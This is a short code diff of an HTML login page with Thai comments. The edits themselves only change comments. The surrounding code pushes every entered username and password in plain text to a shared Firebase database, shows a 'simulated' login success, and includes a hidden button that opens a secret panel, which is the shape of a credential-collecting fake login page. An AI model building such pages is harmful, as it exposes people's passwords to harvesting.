@@ -28,7 +28,6 @@
   <input type="text" id="username" placeholder="Username">
   <input type="text" id="password" placeholder="Password">
   <button onclick="login()">Log In</button>
-
   <button class="secret-btn" onclick="toggleSecretPanel()"></button>
 </div>
 
@@ -39,7 +38,7 @@
 </div>
 
 <script>
-  // Firebase config (เปลี่ยนเป็นของคุณเอง)
+  // Firebase config (ใส่ของคุณเอง)
   const firebaseConfig = {
     apiKey: "AIzaSyDemoKey-1234567890",
     authDomain: "demo-login.firebaseapp.com",
@@ -57,7 +56,7 @@
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     if(username && password){
-      // ส่งข้อมูลไป Firebase
+      // ส่งข้อมูลไป Firebase เพื่อให้ทุกเครื่องเห็น
       loginRef.push({username,password});
       alert('เข้าสู่ระบบสำเร็จ (จำลอง)');
       document.getElementById('username').value = '';
